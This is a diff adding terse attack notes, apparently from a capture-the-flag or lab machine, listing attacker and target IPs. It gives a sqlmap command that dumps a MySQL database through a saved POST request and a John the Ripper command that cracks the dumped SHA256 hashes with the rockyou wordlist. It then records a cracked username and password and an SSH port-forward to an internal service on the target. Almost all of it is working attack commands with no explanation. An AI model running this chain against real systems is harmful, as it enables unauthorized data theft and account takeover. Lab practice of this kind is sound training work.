@@ -1,0 +1,14 @@
+attacker : 10.18.115.106
+target : 10.10.254.191
+
+sqlmap -r post_request --dbms=mysql --dump --output-dir=.
+
+john sqlmaphashes-yi1hz43n.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-SHA256-opencl
+
+agent47
+videogamer124
+
+ssh -L 10000:localhost:10000 agent47@10.10.254.191
+
+
+
